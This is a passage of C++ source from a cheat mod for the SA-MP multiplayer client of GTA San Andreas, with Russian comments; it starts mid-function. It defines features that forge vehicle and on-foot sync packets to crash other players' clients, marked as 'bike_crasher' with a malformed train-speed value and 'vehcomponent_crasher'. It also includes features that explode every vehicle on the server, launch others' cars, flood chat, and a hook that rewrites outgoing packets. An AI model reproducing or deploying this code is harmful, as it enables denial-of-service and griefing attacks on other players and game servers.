struct actor_info	*self = actor_info_get( ACTOR_SELF, ACTOR_ALIVE );
int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
struct vehicle_info *info = vehicle_info_get( car_id, 0 );
USHORT VehicleID = v;
float coord[3]; 
coord[0] = pPedSelf->GetPosition()->fY; 
coord[1] = pPedSelf->GetPosition()->fY; 
coord[2] = pPedSelf->GetPosition()->fZ; 
float speed[3];
info->speed[0] = (float)(rand() % -99999);
info->speed[1] = (float)(rand() % -99999);
info->speed[2] = (float)(rand() % -99999);
g_RakClient->SendFakeDriverSyncData(VehicleID, coord, 1000, speed, 0);
time = GetTickCount();
}//конец
}}}
 
		 void cheat_handle_cardrive()  
{  
  traceLastFunc( "cheat_handle_cardrive()" );  
  if( cheat_state->_generic.cardrive == 1 )  
  {  

	struct actor_info *self = actor_info_get(-1, ACTOR_ALIVE);
    struct vehicle_info *info = vehicle_info_get( -1, 0 );
    if (info != NULL)
    {
    self->fCurrentRotation = -pGame->GetCamera()->GetCameraRotation();
    self->fTargetRotation = self->fCurrentRotation;
    info->base.matrix[4] = sinf(-self->fCurrentRotation);
    info->base.matrix[5] = cosf(-self->fCurrentRotation);
    if (KEY_DOWN('W')) ///W для езды вперед
    {
    info->speed[0] = sinf(-self->fCurrentRotation) * 0.8; ///0.8 скорость
    info->speed[1] = cosf(-self->fCurrentRotation) * 0.8;
    }
    if (KEY_DOWN('S'))///S для езды назад
    {
    info->speed[0] = sinf(-self->fCurrentRotation) * -0.5;
    info->speed[1] = cosf(-self->fCurrentRotation) * -0.5;
    }
    if (KEY_DOWN(0x20))//Space для взлета
    {
    info->speed[2] += 0.05;
    }
    if (KEY_DOWN(0xA2))///LCtrl для приземления
    {
    info->speed[2] -= 0.05;
    }
    if (KEY_DOWN(0xA0))//LShift для торможения
    {
    info->speed[0] = 0.0;
    info->speed[1] = 0.0;
    }
	}

  }  
 
}  
		 void gen_random1(char *s, const int len)
{
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i)
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	s[len] = 0;
}

void cheat_handle_emo ( struct vehicle_info *vehicle_info, struct actor_info *actor_info, float time_diff )
{
	traceLastFunc( "cheat_handle_emo()" );

	struct vehicle_info *vtemp;

	if ( !isBadPtr_GTA_pPed(actor_info) )
	{
		if ( KEY_PRESSED(set.key_self_destruct) )
			actor_info->hitpoints = 0.0f;
	}
	else if ( !isBadPtr_GTA_pVehicle(vehicle_info) )
	{
		actor_info = actor_info_get(ACTOR_SELF, 0);
		if ( actor_info->state == ACTOR_STATE_DRIVING && actor_info->vehicle->passengers[0] == actor_info )
		{
			if ( KEY_PRESSED(set.key_self_destruct) )
			{
				for ( vtemp = vehicle_info; vtemp != NULL; vtemp = vtemp->trailer )
				{
					if(vtemp == NULL) return;

					vtemp->hitpoints = 1.0f;
					cheat_vehicle_tires_set( vtemp, 1 );
					if ( !set.trailer_support )
						break;
				}
			}
		}
	}
}

void cheat_handle_exit_vehicle ( struct vehicle_info *vehicle_info, struct actor_info *actor_info )
{
	if (!isBadPtr_GTA_pVehicle(vehicle_info))
	{
		if (vehicle_info != cheat_state->_generic.pVehicleExit_Last)
		{
			if (!isBadPtr_GTA_pVehicle(cheat_state->_generic.pVehicleExit_Last))
			{
				cheat_state->_generic.pVehicleExit_Last->m_nVehicleFlags.bCanBeDamaged = true;
			}
			cheat_state->_generic.pVehicleExit_Last = vehicle_info;
		}
	}
	if (!isBadPtr_GTA_pPed(actor_info))
	{
		if (!isBadPtr_GTA_pVehicle(cheat_state->_generic.pVehicleExit_Last))
		{
			cheat_state->_generic.pVehicleExit_Last->m_nVehicleFlags.bCanBeDamaged = true;
			cheat_state->_generic.pVehicleExit_Last = NULL;
		}
	}
}

// sa-mp only
void cheat_handle_antiHijack ( actor_info *ainfo, vehicle_info *veh, float time_diff )
{
	if ( g_SAMP == NULL )
		return;

	traceLastFunc( "cheat_handle_antiHijack()" );

	if ( set.anti_carjacking && veh == NULL )
	{
		if ( cheat_state->_generic.got_vehicle_id )
			cheat_state->_generic.got_vehicle_id = false;
		if ( cheat_state->_generic.anti_carjackTick
		 &&	 cheat_state->_generic.anti_carjackTick < (GetTickCount() - 500)
		 &&	 cheat_state->_generic.car_jacked )
		{
			if ( cheat_state->_generic.car_jacked_last_vehicle_id == 0 )
			{
				showGameText( "~r~Unable To Unjack~w~!", 1000, 5 );
				cheat_state->_generic.anti_carjackTick = 0;
				cheat_state->_generic.car_jacked = false;
				return;
			}

			cheat_state->_generic.anti_carjackTick = 0;
			cheat_state->_generic.car_jacked = false;
			cheat_state->_generic.unrelatedToAnything = 1337;
			GTAfunc_PutActorInCar(GetVehicleByGtaId(cheat_state->_generic.car_jacked_last_vehicle_id));
			cheat_state->_generic.unrelatedToAnything = 0x1337;

			struct vehicle_info *veh = GetVehicleByGtaId( cheat_state->_generic.car_jacked_last_vehicle_id );
			//if ( veh != NULL )
			//	vect3_copy( cheat_state->_generic.car_jacked_lastPos, &veh->base.matrix[4 * 3] );
			showGameText( "~r~Car Unjacked~w~!", 1000, 5 );
			return;
		}
	}
	else if ( set.anti_carjacking )
	{
		if ( veh->passengers[0] == actor_info_get(ACTOR_SELF, 0) )
		{
			if ( !cheat_state->_generic.got_vehicle_id )
			{
				cheat_state->_generic.car_jacked_last_vehicle_id = getPlayerVehicleGTAScriptingID( ACTOR_SELF );
				if ( cheat_state->_generic.car_jacked_last_vehicle_id > 0 )
					cheat_state->_generic.got_vehicle_id = true;
			}
		}
	}
}

void cheat_handle_gggg () 
{
	traceLastFunc( "cheat_handle_gggg()" ); 
      if( cheat_state->_generic.gggg == 1 ) 
     {
	for ( int i = 0; i < 1; i++) 
{ 
if ( strlen(set.flooder[i]) == 0) 
continue; 
say( "%s", set.flooder[i] );
	}
	  }
	return; 
}

void cheat_handle_crh () 
{ 
     traceLastFunc( "cheat_handle_crh()" ); 
      if( cheat_state->_generic.crh == 1 ) 
     {
    vehicle_addUpgrade(vehicle_info_get(VEHICLE_SELF, 0),  rand()%25 + 1073);
			} 
     return; 
}

void cheat_handle_pulsedisk1 () 
{ 
     traceLastFunc( "cheat_handle_pulsedisk1()" ); 
      if( cheat_state->_generic.pulsedisk1 == 1 ) 
     {
     
       static int color_state=0;       

       if (color_state == 0)       

       {       
       vehicle_setColor0( vehicle_info_get(VEHICLE_SELF, 0), rand()%180 );       
       vehicle_setColor1( vehicle_info_get(VEHICLE_SELF, 0), rand()%180 );      
       }      
			} 
     return; 
}
void cheat_handle_qqqq1 () 
{ 
     traceLastFunc( "cheat_handle_qqqq1()" ); 
      if( cheat_state->_generic.qqqq1 == 1 ) 
     {  
     vehicle_setPaintJob(vehicle_info_get(VEHICLE_SELF, 0), rand()%4 );
			} 
     return; 
}



void cheat_handle_vehcomponent_crasher ()
{
	traceLastFunc( "cheat_handle_vehcomponent_crasher()" );

	if(cheat_state->_generic.vehcomponentcrasher == 1)
	{
		static int time = 0;
		if (GetTickCount() - 200 > time)
		{

	GTAfunc_PerformAnimation("ped", "HIT_walk", 22, 22, 22, 22, 22, 22, 22, 22);
	//GTAfunc_PerformAnimation("ped", "HIT_walk", -1, 0, 1, 0, 0, 0, 0, 0);
	time = GetTickCount();
		}
	}}




void cheat_handle_bike_crasher()
{
	traceLastFunc( "cheat_handle_bike_crasher()" );

	if(cheat_state->_generic.bikecrasher == 0)
		return;

	if(g_Players == NULL && g_Vehicles == NULL)
		return;

	struct actor_info *pSelfActor = actor_info_get( ACTOR_SELF, 0 );
	struct vehicle_info *pSelfVehicle = vehicle_info_get( VEHICLE_SELF, NULL );

	float *coord = ( cheat_state->state == CHEAT_STATE_VEHICLE ) ? cheat_state->vehicle.coords : cheat_state->actor.coords;

	static bool bBikeCrasherState = 0;
	static bool bTrainSpeedState = 0;
	static DWORD dwBikeCrasherTimerTick = GetTickCount();

	uint16_t sCurrentVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;

	BYTE byteCurrentWeapon;

	if ( cheat_state->state == CHEAT_STATE_VEHICLE )
		byteCurrentWeapon = g_Players->pLocalPlayer->inCarData.byteCurrentWeapon;

	else if ( cheat_state->state == CHEAT_STATE_ACTOR )
		byteCurrentWeapon = g_Players->pLocalPlayer->onFootData.byteCurrentWeapon;

	else byteCurrentWeapon = 0;

	if(dwBikeCrasherTimerTick < GetTickCount() - 50)
	{
		if(!bBikeCrasherState)
		{
			stInCarData vehSync;
			BitStream bsVehicleSync;

			memset(&vehSync, 0, sizeof(stInCarData));

			vehSync.sVehicleID = sCurrentVehicleID;

			vehSync.bytePlayerHealth = pSelfActor->hitpoints;
			vehSync.byteArmor = pSelfActor->armor;

			vehSync.byteCurrentWeapon = byteCurrentWeapon;

			vehSync.fPosition[0] = coord[0];
			vehSync.fPosition[1] = coord[1];
			vehSync.fPosition[2] = coord[2];

			vehSync.fVehicleHealth = pSelfVehicle->hitpoints;

			if(!bTrainSpeedState)
				vehSync.fTrainSpeed = (float)0xFFFFFFFFFFFFFFFF;

			bTrainSpeedState ^= 1;
			
			g_RakClient->SendFakeDriverFullSyncData(&vehSync, 0);
		}
		else
		{
			float fPos[3], fSpeed[3];

			fPos[0] = coord[0];
			fPos[1] = coord[1];
			fPos[2] = coord[2] + 1.5f;

			g_RakClient->SendFakeOnfootSyncData1(fPos, pSelfActor->hitpoints, 0,  fSpeed);
		}

		bBikeCrasherState ^= 1;
		dwBikeCrasherTimerTick = GetTickCount();
	}
}

float getDistanceFromLocalPlayer(float fX, float fY, float fZ)
{
	struct actor_info *pSelfActor = actor_info_get( ACTOR_SELF, 0 );

	if(pSelfActor == NULL)
		return 999999999.9f;
	
	float fSX = (fX - pSelfActor->base.coords[0]) * (fX - pSelfActor->base.coords[0]);
	float fSY = (fY - pSelfActor->base.coords[1]) * (fY - pSelfActor->base.coords[1]);
	float fSZ = (fZ - pSelfActor->base.coords[2]) * (fZ - pSelfActor->base.coords[2]);
	
	return (float)sqrt(fSX + fSY + fSZ);
}

int sampFindNearestDriver()
{
	unsigned int iClosestPlayerID = 0xFFFF;
	float fClosestPlayerDistance = 999999999.9f;
	float fTargetPos[3];
	float fDistances[SAMP_PLAYER_MAX];

	for ( int p = 0; p < SAMP_PLAYER_MAX; p++ )
	{
		fDistances[p] = 999999999.9f;

		if(getPlayerPos(p, fTargetPos) && getPlayerState(p) == PLAYER_STATE_DRIVER)
			fDistances[p] = getDistanceFromLocalPlayer(fTargetPos[0], fTargetPos[1], fTargetPos[2]);
	}

	for ( int p = 0; p < SAMP_PLAYER_MAX; p++ )
	{
		if(fClosestPlayerDistance > fDistances[p] && fDistances[p] != 999999999.9f)
		{
			iClosestPlayerID = p;
			fClosestPlayerDistance = fDistances[p];
		}
	}

	if(iClosestPlayerID != 0xFFFF && fClosestPlayerDistance != 999999999.9f)
		return iClosestPlayerID;
	else
		return 0xFFFF;
}

void cheat_handle_carshooter ()
{
	traceLastFunc( "cheat_handle_carshooter()" );

	static int once = 1;
	static int carUsed[SAMP_VEHICLE_MAX];

	if( cheat_state->_generic.carshooter == 1 )
	{
		struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;
		static int x = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		if ( KEY_DOWN(VK_LBUTTON) )
		{
			float fPos[3];
			vect3_copy( &self->base.matrix[4 * 3], fPos );

			fPos[0] += cam_matrix[4] * (6.0f + x);
			fPos[1] += cam_matrix[5] * (6.0f + x);
			fPos[2] += cam_matrix[6] * (6.0f + x);

			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 7.5f;
			fSpeed[1] = cam_matrix[5] * 7.5f;
			fSpeed[2] = cam_matrix[6] * 7.5f;

			stInCarData vehSync;
			memset(&vehSync, 0, sizeof(stInCarData));

			vehSync.sVehicleID = iSAMPVehicleID;
			vehSync.fPosition[0] = fPos[0];
			vehSync.fPosition[1] = fPos[1];
			vehSync.fPosition[2] = fPos[2];
			vehSync.fVehicleHealth = vinfo->hitpoints;
			vehSync.fMoveSpeed[0] = fSpeed[0];
			vehSync.fMoveSpeed[1] = fSpeed[1];
			vehSync.fMoveSpeed[2] = fSpeed[2];
			vehSync.sKeys = 0;
			vehSync.bytePlayerHealth = self->hitpoints;
			vehSync.byteArmor = self->armor;

			g_RakClient->SendFakeDriverFullSyncData(&vehSync, 0);
			cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );
			vinfo->speed[0] = fSpeed[0];
			vinfo->speed[1] = fSpeed[1];
			vinfo->speed[2] = fSpeed[2];

			x--;
			if ( x < -1 ) x = 0;

			v++;
		}

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;
	}}


		

void cheat_handle_explodecars ()
{
	traceLastFunc( "cheat_handle_explodecars()" );

	if( cheat_state->_generic.explodecars == 1 )
	{
		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &vinfo->base.matrix[4 * 3], fPos );

		g_RakClient->SendFakeDriverSyncData(iSAMPVehicleID, fPos, 0.0f, vinfo->speed, 0);
		vinfo->hitpoints = 0.0f;

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
		{
			v = 0;
			cheat_state->_generic.explodecars = 0;
		}
	}
}





bool RakClient::Send( RakNet::BitStream * bitStream, PacketPriority priority, PacketReliability reliability, unsigned orderingChannel )
{
	BYTE packetId;
	bitStream->Read(packetId);

	if(packetId == ID_VEHICLE_SYNC)
	{
		stInCarData OutgoingOnFootData;
			
		bitStream->ResetReadPointer();

		bitStream->Read(packetId);
		bitStream->Read((PCHAR)&OutgoingOnFootData, sizeof(stInCarData));
		
	if(cheat_state->_generic.log_packet_send)
		{
	      static float fRotation = 0.0f;

			OutgoingOnFootData.fQuaternion[0] = cosf(fRotation);
			OutgoingOnFootData.fQuaternion[3] = sinf(fRotation);

			static DWORD timer = 0;
			if ( GetTickCount() - timer > 1 )
			{
				fRotation += 1.0f;
				if ( fRotation >= 360.0f ) fRotation = 0.0f;

				timer = GetTickCount();
			}

			static DWORD timer2 = 0;
			if ( GetTickCount() - timer2 > 1 )
			{
				OutgoingOnFootData.sUpDownKeys = 128;
				timer2 = GetTickCount();
			}
			bitStream->Reset();

		bitStream->Write((BYTE)ID_VEHICLE_SYNC);
		bitStream->Write((PCHAR)&OutgoingOnFootData,sizeof(stInCarData));
	
	//bitStream->Write(true); //is acknowledgment packet
//unsigned short count = 2;
//bitStream->WriteCompressed(count); //how many
//for (int i = 0; i < count; i++)
//{
      //  bitStream->Write(false); //is min==max
      //  bitStream->Write((unsigned short)0); //min index
      //  bitStream->Write((unsigned short)0xFFFF); //max index
//}
	//if(cheat_state->_generic.log_packet_send)
	//{
	//	Log( "< [Packet Send] id: %d, len: %d", packetId, bitStream->GetNumberOfBytesUsed() );
		//addMessageToChatWindow( "< [Packet Send] id: %d, len: %d", packetId, bitStream->GetNumberOfBytesUsed() );
	//}
		
	return RakPeer::Send( bitStream, priority, reliability, orderingChannel, remoteSystemList[ 0 ].playerId, false );
	}}}







